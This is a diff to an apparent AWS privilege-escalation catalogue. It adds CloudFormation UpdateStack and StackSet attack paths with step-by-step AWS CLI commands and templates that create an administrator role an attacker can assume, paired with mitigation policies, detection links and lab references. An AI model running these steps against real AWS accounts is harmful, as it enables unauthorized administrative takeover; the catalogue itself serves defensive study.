@@ -269,13 +269,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -538,13 +538,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -772,13 +772,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-11T22:03:14-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -979,13 +979,13 @@
       "pacu": "https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L1375"
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-11T22:03:14-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -1199,17 +1199,727 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
     "filePath": "data/paths/cloudformation/cloudformation-001.yaml"
+  },
+  {
+    "id": "cloudformation-002",
+    "name": "cloudformation:UpdateStack",
+    "category": "access-resource",
+    "services": [
+      "cloudformation",
+      "iam"
+    ],
+    "description": "A principal with `cloudformation:UpdateStack` can modify an existing CloudFormation stack that has an administrative service role attached. CloudFormation stacks execute with the permissions of their service role, which often requires elevated privileges to manage infrastructure. By updating the stack template to include new IAM resources (such as an admin role with a trust policy allowing the attacker to assume it), the attacker can leverage the stack's elevated permissions to create resources they couldn't create directly. This is particularly insidious because it appears as legitimate infrastructure management activity.",
+    "prerequisites": {
+      "admin": [
+        "A CloudFormation stack must exist with an administrative service role (e.g., AdministratorAccess or an equivalent custom policy)",
+        "The principal must have permission to update that specific stack"
+      ],
+      "lateral": [
+        "A CloudFormation stack must exist with a service role that has elevated permissions",
+        "The principal must have permission to update that specific stack"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws cloudformation describe-stacks \\\n  --stack-name TARGET_STACK_NAME \\\n  --query 'Stacks[0].[StackName,StackStatus,RoleARN]'\n",
+          "description": "Identify CloudFormation stacks with elevated service roles"
+        },
+        {
+          "step": 2,
+          "command": "aws cloudformation get-template \\\n  --stack-name TARGET_STACK_NAME \\\n  --query 'TemplateBody'\n",
+          "description": "Retrieve the current stack template"
+        },
+        {
+          "step": 3,
+          "command": "# Create modified template with added IAM role\n# Add resource like:\n# EscalatedAdminRole:\n#   Type: AWS::IAM::Role\n#   Properties:\n#     RoleName: escalated-admin-role\n#     AssumeRolePolicyDocument:\n#       Statement:\n#         - Effect: Allow\n#           Principal:\n#             AWS: arn:aws:iam::ACCOUNT_ID:user/ATTACKER_USER\n#           Action: sts:AssumeRole\n#     ManagedPolicyArns:\n#       - arn:aws:iam::aws:policy/AdministratorAccess\n",
+          "description": "Modify the template to add an IAM role with admin permissions and a trust policy allowing you to assume it"
+        },
+        {
+          "step": 4,
+          "command": "aws cloudformation update-stack \\\n  --stack-name TARGET_STACK_NAME \\\n  --template-body file://modified-template.json \\\n  --capabilities CAPABILITY_NAMED_IAM\n",
+          "description": "Update the CloudFormation stack with the modified template (stack's service role creates the new admin role)"
+        },
+        {
+          "step": 5,
+          "command": "aws cloudformation wait stack-update-complete \\\n  --stack-name TARGET_STACK_NAME\n",
+          "description": "Wait for the stack update to complete"
+        },
+        {
+          "step": 6,
+          "command": "aws sts assume-role \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/escalated-admin-role \\\n  --role-session-name escalation-session\n",
+          "description": "Assume the newly created admin role"
+        },
+        {
+          "step": 7,
+          "command": "# Configure AWS CLI with the temporary credentials from step 6\n# Now you have administrator access\naws iam list-users\n",
+          "description": "Verify administrator access"
+        }
+      ]
+    },
+    "recommendation": "Restrict the `cloudformation:UpdateStack` permission using the principle of least privilege.\n\nUse IAM policy conditions to restrict which stacks can be updated:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"cloudformation:UpdateStack\",\n  \"Resource\": \"arn:aws:cloudformation:*:*:stack/approved-stack-name/*\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"cloudformation:StackId\": \"arn:aws:cloudformation:*:*:stack/approved-stack/*\"\n    }\n  }\n}\n```\n\nAdditional controls:\n- Implement least privilege principles for CloudFormation service roles - avoid granting AdministratorAccess when more granular permissions suffice\n- Use CloudFormation stack policies to prevent modifications to sensitive resources:\n  ```json\n  {\n    \"Statement\": [\n      {\n        \"Effect\": \"Deny\",\n        \"Principal\": \"*\",\n        \"Action\": \"Update:*\",\n        \"Resource\": \"LogicalResourceId/SensitiveRole\"\n      }\n    ]\n  }\n  ```\n- Implement Service Control Policies (SCPs) to restrict CloudFormation stack updates that create or modify IAM resources\n- Monitor CloudTrail for `UpdateStack` API calls, especially those that modify stacks with elevated service roles\n- Enable CloudFormation drift detection and alerts to identify unauthorized stack modifications\n- Require MFA for CloudFormation updates using condition keys like `aws:MultiFactorAuthPresent`\n- Use IAM Access Analyzer to identify and remediate privilege escalation paths involving CloudFormation permissions\n- Implement change approval workflows for CloudFormation stack updates that modify IAM resources\n- Regularly audit CloudFormation service roles and reduce permissions to the minimum required for stack operations\n",
+    "limitations": "This privilege escalation path requires:\n- An existing CloudFormation stack with an elevated service role\n- Permission to update that specific stack (resource-level permissions may restrict which stacks can be updated)\n- The stack's service role must have IAM permissions to create roles and attach policies\n- Stack policies may prevent modifications to certain resources\n- Organizations may have SCPs that restrict CloudFormation IAM operations\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2019"
+    },
+    "references": [
+      {
+        "title": "AWS IAM Privilege Escalation - Methods and Mitigation (Rhino Security Labs)",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      },
+      {
+        "title": "Escalating AWS IAM Privileges with an Undocumented CodeStar API",
+        "url": "https://rhinosecuritylabs.com/aws/escalating-aws-iam-privileges-undocumented-codestar-api/"
+      },
+      {
+        "title": "CloudFormation Change Set Privilege Escalation",
+        "url": "https://dev.to/aws-builders/cloudformation-change-set-privilege-escalation-18i6"
+      },
+      {
+        "title": "AWS IAM Privilege Escalation Techniques (HackingThe.Cloud)",
+        "url": "https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/"
+      },
+      {
+        "title": "AWS CloudFormation Service Role Documentation",
+        "url": "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/using-iam-servicerole.html"
+      },
+      {
+        "title": "CloudFormation Stack Policies",
+        "url": "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/protect-stack-resources.html"
+      },
+      {
+        "title": "Service Roles for CloudFormation (AWS Prescriptive Guidance)",
+        "url": "https://docs.aws.amazon.com/prescriptive-guidance/latest/least-privilege-cloudformation/service-roles-for-cloudformation.html"
+      }
+    ],
+    "relatedPaths": [
+      "cloudformation-001"
+    ],
+    "permissions": {
+      "required": [
+        {
+          "permission": "cloudformation:UpdateStack",
+          "resourceConstraints": "Must have permission to update the target CloudFormation stack"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "cloudformation:DescribeStacks",
+          "resourceConstraints": "Helpful for identifying stacks with elevated service roles"
+        },
+        {
+          "permission": "cloudformation:GetTemplate",
+          "resourceConstraints": "Useful for retrieving the current stack template to modify"
+        },
+        {
+          "permission": "iam:GetRole",
+          "resourceConstraints": "Helpful for verifying the escalated role was created"
+        },
+        {
+          "permission": "sts:AssumeRole",
+          "resourceConstraints": "Required to assume the newly created admin role"
+        }
+      ]
+    },
+    "learningEnvironments": {
+      "pathfinder-labs": {
+        "type": "open-source",
+        "githubLink": "https://github.com/DataDog/pathfinder-labs",
+        "scenario": "privesc-one-hop/to-admin/cloudformation-updatestack",
+        "description": "Deploy Terraform into your own AWS account to practice this attack path"
+      },
+      "iam-vulnerable": {
+        "type": "open-source",
+        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
+        "scenario": "CloudFormation-UpdateStack",
+        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths (requires CloudFormation non-free module, ~$0.40/month)"
+      }
+    },
+    "detectionTools": {
+      "pmapper": "https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/cloudformation_edges.py#L106-L138"
+    },
+    "attackVisualization": {
+      "nodes": [
+        {
+          "id": "start",
+          "label": "Starting Principal",
+          "type": "principal",
+          "description": "The starting principal (user or role) with `cloudformation:UpdateStack` permission on the target stack. This principal can modify the stack template to add new AWS resources that will be created with the stack's service role permissions.\n"
+        },
+        {
+          "id": "existing_stack",
+          "label": "Existing CloudFormation Stack",
+          "type": "resource",
+          "description": "An existing CloudFormation stack with an administrative service role attached. The stack's service role typically has elevated permissions (e.g., AdministratorAccess) to manage infrastructure resources. The attacker has permission to update this specific stack through `cloudformation:UpdateStack`.\n"
+        },
+        {
+          "id": "stack_role",
+          "label": "Stack's Administrative Service Role",
+          "type": "resource",
+          "description": "The IAM role attached to the CloudFormation stack as its service role. This role trusts cloudformation.amazonaws.com and has administrative permissions required to manage infrastructure. When the stack is updated, CloudFormation uses this role's permissions to create, modify, or delete resources defined in the template.\n"
+        },
+        {
+          "id": "update_template",
+          "label": "Update Stack Template",
+          "type": "action",
+          "color": "#99ccff",
+          "description": "The attacker modifies the stack template to add a new IAM role resource with administrative permissions and a trust policy allowing the attacker to assume it. The modified template is then applied to the stack using `cloudformation:UpdateStack`.\n\nThe new IAM role typically includes:\n- `AssumeRolePolicyDocument` with trust policy allowing the attacker's principal to assume it\n- `ManagedPolicyArns` including arn:aws:iam::aws:policy/AdministratorAccess\n- Or inline policies granting administrative permissions\n\nThis appears as legitimate infrastructure management activity, making it harder to detect than direct IAM modifications.\n"
+        },
+        {
+          "id": "new_admin_role",
+          "label": "Newly Created Admin Role",
+          "type": "resource",
+          "description": "The new IAM role created by the CloudFormation stack update. This role has administrative permissions (AdministratorAccess or equivalent) and a trust policy that allows the starting principal to assume it. The role is created using the stack's administrative service role permissions, bypassing the starting principal's limited IAM permissions.\n"
+        },
+        {
+          "id": "admin_outcome",
+          "label": "Effective Administrator",
+          "type": "outcome",
+          "description": "The attacker successfully assumes the newly created admin role and gains full administrative access to the AWS account. The privilege escalation is complete.\n"
+        }
+      ],
+      "edges": [
+        {
+          "from": "start",
+          "to": "existing_stack",
+          "label": "cloudformation:UpdateStack",
+          "description": "The attacker identifies a CloudFormation stack with an administrative service role and uses `cloudformation:UpdateStack` to modify the stack template. This requires permission to update the specific stack.\n\nFirst, identify target stacks with elevated service roles:\n```bash\naws cloudformation describe-stacks \\\n  --stack-name TARGET_STACK_NAME \\\n  --query 'Stacks[0].[StackName,StackStatus,RoleARN]'\n```\n\nThen retrieve the current template:\n```bash\naws cloudformation get-template \\\n  --stack-name TARGET_STACK_NAME \\\n  --query 'TemplateBody'\n```\n"
+        },
+        {
+          "from": "existing_stack",
+          "to": "stack_role",
+          "label": "Stack uses service role",
+          "description": "The CloudFormation stack is configured to use an administrative IAM role as its service role. All resource creation, modification, and deletion operations performed by the stack execute with this role's permissions. This is the key to the privilege escalation - the attacker leverages the stack's elevated permissions to create resources they couldn't create directly.\n"
+        },
+        {
+          "from": "stack_role",
+          "to": "update_template",
+          "label": "Modify template",
+          "description": "The attacker creates a modified version of the stack template that adds a new IAM role resource with administrative permissions. The new role includes a trust policy allowing the attacker's principal to assume it.\n\nExample IAM role resource to add to template:\n```yaml\nEscalatedAdminRole:\n  Type: AWS::IAM::Role\n  Properties:\n    RoleName: escalated-admin-role\n    AssumeRolePolicyDocument:\n      Statement:\n        - Effect: Allow\n          Principal:\n            AWS: arn:aws:iam::ACCOUNT_ID:user/ATTACKER_USER\n          Action: sts:AssumeRole\n    ManagedPolicyArns:\n      - arn:aws:iam::aws:policy/AdministratorAccess\n```\n"
+        },
+        {
+          "from": "update_template",
+          "to": "new_admin_role",
+          "label": "Stack creates new admin role",
+          "description": "Update the stack with the modified template. The stack's administrative service role executes the template and creates the new IAM role with admin permissions.\n\nCommand:\n```bash\naws cloudformation update-stack \\\n  --stack-name TARGET_STACK_NAME \\\n  --template-body file://modified-template.json \\\n  --capabilities CAPABILITY_NAMED_IAM\n```\n\nWait for the update to complete:\n```bash\naws cloudformation wait stack-update-complete \\\n  --stack-name TARGET_STACK_NAME\n```\n\nThe `--capabilities CAPABILITY_NAMED_IAM` flag is required when the template creates IAM resources with custom names.\n"
+        },
+        {
+          "from": "new_admin_role",
+          "to": "admin_outcome",
+          "label": "sts:AssumeRole",
+          "description": "The attacker assumes the newly created admin role using `sts:AssumeRole`. The role's trust policy explicitly allows the attacker's principal to assume it, and the role has administrative permissions.\n\nCommand:\n```bash\naws sts assume-role \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/escalated-admin-role \\\n  --role-session-name escalation-session\n```\n\nConfigure the AWS CLI with the temporary credentials from the assume-role response, then verify administrative access:\n```bash\naws iam list-users\n```\n\nThe attacker now has full administrative access to the AWS account.\n"
+        }
+      ]
+    },
+    "gitMetadata": {
+      "created": null,
+      "lastUpdated": null,
+      "contributors": []
+    },
+    "filePath": "data/paths/cloudformation/cloudformation-002.yaml"
+  },
+  {
+    "id": "cloudformation-003",
+    "name": "iam:PassRole + cloudformation:CreateStackSet + cloudformation:CreateStackInstances",
+    "category": "service-passrole",
+    "services": [
+      "iam",
+      "cloudformation"
+    ],
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:PassRole",
+          "resourceConstraints": "Must have permission to pass a privileged execution role to CloudFormation StackSets"
+        },
+        {
+          "permission": "cloudformation:CreateStackSet",
+          "resourceConstraints": "Must have permission to create new CloudFormation StackSets"
+        },
+        {
+          "permission": "cloudformation:CreateStackInstances",
+          "resourceConstraints": "Must have permission to deploy stack instances from the StackSet"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "cloudformation:DescribeStackSet",
+          "resourceConstraints": "Helpful for monitoring StackSet creation progress and verifying configuration"
+        },
+        {
+          "permission": "cloudformation:DescribeStackSetOperation",
+          "resourceConstraints": "Useful for checking the status of StackSet operations and waiting for completion"
+        },
+        {
+          "permission": "cloudformation:ListStackInstances",
+          "resourceConstraints": "Helpful for listing deployed stack instances"
+        },
+        {
+          "permission": "iam:ListRoles",
+          "resourceConstraints": "Useful for discovering available privileged roles to pass to StackSets"
+        },
+        {
+          "permission": "iam:GetRole",
+          "resourceConstraints": "Helpful for examining role policies to understand what resources can be created"
+        }
+      ]
+    },
+    "description": "A principal with `iam:PassRole`, `cloudformation:CreateStackSet`, and `cloudformation:CreateStackInstances` can escalate privileges by creating a CloudFormation StackSet with a privileged execution role and then deploying stack instances to execute the malicious template. CloudFormation StackSets use a two-step process - `CreateStackSet` defines the template and configuration but does not actually deploy any resources, while `CreateStackInstances` deploys the StackSet to specific target accounts and regions, which triggers the actual resource creation. Both permissions are required for the attack - without `CreateStackInstances`, the StackSet remains just a definition and no malicious resources are created. StackSets use two roles - an administration role (used by the CloudFormation service) and an execution role (used to perform the actual resource creation in each target account). When an attacker passes a privileged execution role and deploys stack instances, they gain the ability to create any AWS resources that execution role has permissions for by defining those resources in the template. This commonly includes IAM resources such as roles with elevated permissions and trust policies allowing the attacker to assume them, effectively enabling the attacker to inherit the execution role's privileges and gain administrative access to the target accounts.",
+    "prerequisites": {
+      "admin": [
+        "A privileged IAM role must exist that can be passed as a StackSet execution role",
+        "The execution role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)",
+        "An administration role must exist that trusts cloudformation.amazonaws.com and has permissions to assume the execution role"
+      ],
+      "lateral": [
+        "A privileged IAM role must exist that can be passed as a StackSet execution role",
+        "The execution role must have elevated permissions to create the desired resources",
+        "An administration role must exist for StackSet operations"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws iam list-roles \\\n  --query 'Roles[*].{Name:RoleName,Arn:Arn}' \\\n  --output table\n",
+          "description": "List available IAM roles to identify potential execution roles with elevated permissions that can be passed to StackSets"
+        },
+        {
+          "step": 2,
+          "command": "aws iam get-role \\\n  --role-name EXECUTION_ROLE_NAME \\\n  --query 'Role.{AssumeRolePolicy:AssumeRolePolicyDocument,AttachedPolicies:AttachedManagedPolicies}'\n",
+          "description": "Examine the execution role's trust policy and attached policies to verify it can be passed to CloudFormation and understand what resources it can create"
+        },
+        {
+          "step": 3,
+          "command": "cat > template.yaml << 'EOF'\nAWSTemplateFormatVersion: '2010-09-09'\nDescription: 'Template defining resources to be created by StackSet'\nResources:\n  # Define AWS resources that the execution role has permissions to create\n  # Commonly IAM roles, policies, or other privileged resources\nEOF\n",
+          "description": "Create a CloudFormation template defining the resources to be created. The template should include resources that provide privilege escalation, such as IAM roles with trust policies allowing you to assume them"
+        },
+        {
+          "step": 4,
+          "command": "aws cloudformation create-stack-set \\\n  --stack-set-name escalation-stackset \\\n  --template-body file://template.yaml \\\n  --administration-role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \\\n  --execution-role-name EXECUTION_ROLE_NAME \\\n  --capabilities CAPABILITY_NAMED_IAM\n",
+          "description": "Create a CloudFormation StackSet, passing the privileged execution role via iam:PassRole. The StackSet will use this role's permissions when deploying stack instances"
+        },
+        {
+          "step": 5,
+          "command": "aws cloudformation create-stack-instances \\\n  --stack-set-name escalation-stackset \\\n  --accounts ACCOUNT_ID \\\n  --regions REGION \\\n  --operation-preferences FailureToleranceCount=0,MaxConcurrentCount=1\n",
+          "description": "Deploy a stack instance from the StackSet to the target account and region. The execution role will create the resources defined in the template"
+        },
+        {
+          "step": 6,
+          "command": "aws cloudformation describe-stack-set-operation \\\n  --stack-set-name escalation-stackset \\\n  --operation-id OPERATION_ID \\\n  --query 'StackSetOperation.Status'\n",
+          "description": "Monitor the StackSet operation status until it shows SUCCEEDED, indicating the resources have been created"
+        },
+        {
+          "step": 7,
+          "command": "# Use the newly created resources to escalate privileges\n# For example, assume a newly created IAM role:\naws sts assume-role \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/CREATED_ROLE \\\n  --role-session-name escalation-session\n",
+          "description": "Leverage the newly created resources to escalate privileges, such as assuming a newly created IAM role with elevated permissions"
+        }
+      ]
+    },
+    "recommendation": "Restrict access to `iam:PassRole` using the principle of least privilege. Use resource-based conditions to limit which roles can be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/approved-stackset-execution-roles/*\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"cloudformation.amazonaws.com\"\n    }\n  }\n}\n```\n\nRestrict `cloudformation:CreateStackSet` and `cloudformation:CreateStackInstances` permissions to only authorized infrastructure automation principals. These are powerful permissions that should be tightly controlled.\n\nApply IAM permission boundaries to StackSet execution roles to limit what resources they can create, even with administrative policies attached:\n\n```json\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [{\n    \"Effect\": \"Deny\",\n    \"Action\": [\n      \"iam:CreateRole\",\n      \"iam:AttachRolePolicy\",\n      \"iam:PutRolePolicy\",\n      \"iam:CreateUser\",\n      \"iam:CreateAccessKey\"\n    ],\n    \"Resource\": \"*\"\n  }]\n}\n```\n\nUse Service Control Policies (SCPs) to prevent StackSet execution roles from creating sensitive resources. Monitor CloudTrail for `CreateStackSet`, `CreateStackInstances`, and `PassRole` API calls, especially when templates contain IAM resources.\n\nConsider using CloudFormation service-managed StackSets with AWS Organizations, which provide more controlled permission models than self-managed StackSets. Implement change approval workflows for StackSet deployments.\n\nEnable MFA requirements for sensitive CloudFormation operations using IAM condition keys like `aws:MultiFactorAuthPresent`. Use AWS IAM Access Analyzer to identify roles with overly permissive PassRole capabilities.\n\nRegularly audit StackSet execution roles and their permission boundaries to ensure they follow least privilege principles. Review CloudFormation templates for suspicious IAM resource definitions before deployment.\n",
+    "limitations": "This path provides administrative access only if the passed execution role has administrative permissions (e.g., AdministratorAccess policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks or access to sensitive data. The execution role must also have permissions to create IAM resources if privilege escalation through IAM is the goal.\n",
+    "discoveredBy": {
+      "name": "Unknown",
+      "organization": "Unknown"
+    },
+    "references": [
+      {
+        "title": "AWS IAM Privilege Escalation \u2013 Methods and Mitigation - Rhino Security Labs",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      },
+      {
+        "title": "How to implement the principle of least privilege with CloudFormation StackSets - AWS Security Blog",
+        "url": "https://aws.amazon.com/blogs/security/how-to-implement-the-principle-of-least-privilege-with-cloudformation-stacksets/"
+      },
+      {
+        "title": "Grant self-managed permissions - AWS CloudFormation Documentation",
+        "url": "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/stacksets-prereqs-self-managed.html"
+      }
+    ],
+    "relatedPaths": [
+      "cloudformation-001",
+      "cloudformation-002",
+      "cloudformation-004"
+    ],
+    "learningEnvironments": {
+      "pathfinder-labs": {
+        "type": "open-source",
+        "githubLink": "https://github.com/DataDog/pathfinder-labs",
+        "scenario": "privesc-one-hop/to-admin/iam-passrole+cloudformation-createstackset+cloudformation-createstackinstances",
+        "description": "Deploy Terraform into your own AWS account to practice this attack path"
+      }
+    },
+    "attackVisualization": {
+      "nodes": [
+        {
+          "id": "start",
+          "label": "Starting Principal",
+          "type": "principal",
+          "description": "The principal with `iam:PassRole`, `cloudformation:CreateStackSet`, and `cloudformation:CreateStackInstances` permissions. Can be an IAM user or role. This principal will create a StackSet and deploy stack instances to escalate privileges.\n"
+        },
+        {
+          "id": "stackset",
+          "label": "New CloudFormation StackSet",
+          "type": "resource",
+          "description": "A newly created CloudFormation StackSet that defines a template to be deployed across target accounts and regions. The StackSet is configured with both an administration role (used by the CloudFormation service to manage the StackSet) and an execution role (used to create resources in target accounts). The attacker controls the template content, allowing them to define any AWS resources that the execution role has permissions to create.\n"
+        },
+        {
+          "id": "execution_role",
+          "label": "Existing Execution Role",
+          "type": "resource",
+          "description": "The privileged IAM role passed to the StackSet as the execution role. This role must exist in the target account(s) and is used by CloudFormation to create the resources defined in the template. The role's permissions determine what resources can be created and thus the extent of privilege escalation possible.\n"
+        },
+        {
+          "id": "stack_instances",
+          "label": "Deploy Stack Instances",
+          "type": "action",
+          "color": "#99ccff",
+          "description": "Stack instances are deployed from the StackSet to target accounts and regions using `cloudformation:CreateStackInstances`. Each stack instance provisions the resources defined in the template using the execution role's permissions. The attacker can deploy to multiple accounts and regions simultaneously, multiplying the impact of the attack.\n\nCommand to create stack instances:\n```bash\naws cloudformation create-stack-instances \\\n  --stack-set-name escalation-stackset \\\n  --accounts ACCOUNT_ID \\\n  --regions REGION \\\n  --operation-preferences FailureToleranceCount=0,MaxConcurrentCount=1\n```\n\nMonitor deployment progress:\n```bash\naws cloudformation describe-stack-set-operation \\\n  --stack-set-name escalation-stackset \\\n  --operation-id OPERATION_ID\n```\n"
+        },
+        {
+          "id": "template_resources",
+          "label": "Template Creates Resources",
+          "type": "action",
+          "color": "#99ccff",
+          "description": "The CloudFormation template executes in the target account(s) with the execution role's permissions. Common resources for privilege escalation include:\n- IAM roles with trust policies allowing the attacker to assume them\n- IAM users with access keys for the attacker\n- Lambda functions that execute privileged actions\n- IAM policies that grant elevated permissions to the starting principal\n- EC2 instances with User Data scripts that exfiltrate credentials\n\nExample template snippet for privilege escalation:\n```yaml\nResources:\n  PrivilegedRole:\n    Type: AWS::IAM::Role\n    Properties:\n      AssumeRolePolicyDocument:\n        Statement:\n          - Effect: Allow\n            Principal:\n              AWS: arn:aws:iam::ACCOUNT_ID:user/ATTACKER\n            Action: sts:AssumeRole\n      ManagedPolicyArns:\n        - arn:aws:iam::aws:policy/AdministratorAccess\n```\n"
+        },
+        {
+          "id": "admin",
+          "label": "Effective Administrator",
+          "type": "outcome",
+          "description": "If the execution role has administrative permissions (AdministratorAccess or equivalent), the template successfully creates resources that grant the attacker full administrative access to the target account(s). The attacker can assume newly created privileged roles, use generated access keys, or leverage other resources to gain complete control.\n"
+        },
+        {
+          "id": "some_perms",
+          "label": "Check for Additional Access",
+          "type": "outcome",
+          "color": "#ffeb99",
+          "description": "If the execution role has some elevated permissions but not full admin, the template creates resources that grant partial privilege escalation. This could include access to sensitive data (S3, RDS, DynamoDB), security configuration changes, or resources that enable additional privilege escalation paths.\n"
+        },
+        {
+          "id": "no_access",
+          "label": "Minimal Additional Access",
+          "type": "outcome",
+          "color": "#cccccc",
+          "description": "If the execution role only has minimal permissions, the template cannot create resources that provide meaningful privilege escalation. However, even limited access might be useful for reconnaissance or as part of a multi-hop attack chain.\n"
+        }
+      ],
+      "edges": [
+        {
+          "from": "start",
+          "to": "stackset",
+          "label": "iam:PassRole + cloudformation:CreateStackSet",
+          "description": "Create a new CloudFormation StackSet and pass the privileged execution role to it. The StackSet defines the template and configuration for deploying resources across accounts and regions.\n\nCommand:\n```bash\naws cloudformation create-stack-set \\\n  --stack-set-name escalation-stackset \\\n  --template-body file://template.yaml \\\n  --administration-role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \\\n  --execution-role-name EXECUTION_ROLE_NAME \\\n  --capabilities CAPABILITY_NAMED_IAM\n```\n\nThe template.yaml contains malicious resource definitions that will be created with the execution role's permissions. The `--capabilities CAPABILITY_NAMED_IAM` flag is required when creating IAM resources.\n"
+        },
+        {
+          "from": "stackset",
+          "to": "execution_role",
+          "label": "StackSet configured with execution role",
+          "description": "The StackSet is configured to use the execution role for all resource creation operations in target accounts. When stack instances are deployed, CloudFormation will assume this role to provision resources defined in the template.\n"
+        },
+        {
+          "from": "execution_role",
+          "to": "stack_instances",
+          "label": "Deploy instances to target accounts/regions",
+          "description": "Use `cloudformation:CreateStackInstances` to deploy stack instances from the StackSet to target accounts and regions. The execution role's credentials are used by CloudFormation to create resources in each target location.\n"
+        },
+        {
+          "from": "stack_instances",
+          "to": "template_resources",
+          "label": "CloudFormation provisions resources",
+          "description": "CloudFormation provisions the resources defined in the template using the execution role's permissions. The resources are created in each target account and region where stack instances are deployed. The attacker can then access these resources to escalate privileges.\n"
+        },
+        {
+          "from": "template_resources",
+          "to": "admin",
+          "label": "If execution role has admin permissions",
+          "branch": "A",
+          "condition": "admin",
+          "description": "If the execution role has AdministratorAccess or equivalent administrative permissions, the template successfully creates resources that grant the attacker full control over the target account(s). For example, the template could create an IAM role with a trust policy allowing the attacker to assume it, or create an IAM user with access keys.\n"
+        },
+        {
+          "from": "template_resources",
+          "to": "some_perms",
+          "label": "If execution role has some permissions",
+          "branch": "B",
+          "condition": "some_permissions",
+          "description": "If the execution role has elevated but non-administrative permissions, the template creates resources that grant partial privilege escalation. The attacker gains access to data, can modify security configurations, or obtains resources that enable additional attacks.\n"
+        },
+        {
+          "from": "template_resources",
+          "to": "no_access",
+          "label": "If execution role has minimal permissions",
+          "branch": "C",
+          "condition": "no_permissions",
+          "description": "If the execution role only has minimal or non-sensitive permissions, the template cannot create resources that provide meaningful privilege escalation. The attack may yield limited results, though reconnaissance information might still be valuable.\n"
+        }
+      ]
+    },
+    "gitMetadata": {
+      "created": null,
+      "lastUpdated": null,
+      "contributors": []
+    },
+    "filePath": "data/paths/cloudformation/cloudformation-003.yaml"
+  },
+  {
+    "id": "cloudformation-004",
+    "name": "iam:PassRole + cloudformation:UpdateStackSet",
+    "category": "service-passrole",
+    "services": [
+      "iam",
+      "cloudformation"
+    ],
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:PassRole",
+          "resourceConstraints": "Must have permission to pass the administration role to CloudFormation StackSets"
+        },
+        {
+          "permission": "cloudformation:UpdateStackSet",
+          "resourceConstraints": "Must have permission to update the target CloudFormation StackSet"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "cloudformation:DescribeStackSet",
+          "resourceConstraints": "Helpful for viewing StackSet details and verifying configuration"
+        },
+        {
+          "permission": "cloudformation:DescribeStackSetOperation",
+          "resourceConstraints": "Useful for monitoring StackSet update operation progress"
+        },
+        {
+          "permission": "cloudformation:GetTemplate",
+          "resourceConstraints": "Useful for retrieving the current StackSet template to understand existing resources"
+        },
+        {
+          "permission": "cloudformation:ListStackInstances",
+          "resourceConstraints": "Helpful for identifying which accounts and regions have deployed stack instances"
+        },
+        {
+          "permission": "iam:GetRole",
+          "resourceConstraints": "Helpful for examining the execution role's policies to understand what resources can be created"
+        }
+      ]
+    },
